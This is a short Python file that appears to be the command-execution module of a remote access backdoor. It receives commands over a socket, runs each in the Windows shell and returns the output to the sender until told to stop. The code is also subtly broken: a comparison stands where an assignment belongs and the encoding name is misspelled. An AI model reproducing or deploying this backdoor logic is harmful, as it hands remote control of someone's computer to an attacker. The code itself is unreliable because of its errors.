from colorama import Fore
import subprocess

def runcomm(socket):
    print(Fore.GREEN + "[+] Executing commands ")

    while True:
        user_command = socket.receive_data()

        print(user_command)

        if user_command == "stop":
            break

        output == subprocess.run(["cmd", user_command], shell=True, capture_output=True)
        if output.stderr.decode("uft-8") == "":
            cmd_result = output.stdout.decode("uft-8")
        else:
            cmd_result = output.stderr.decode("uft-8")
        socket.send_data(cmd_result)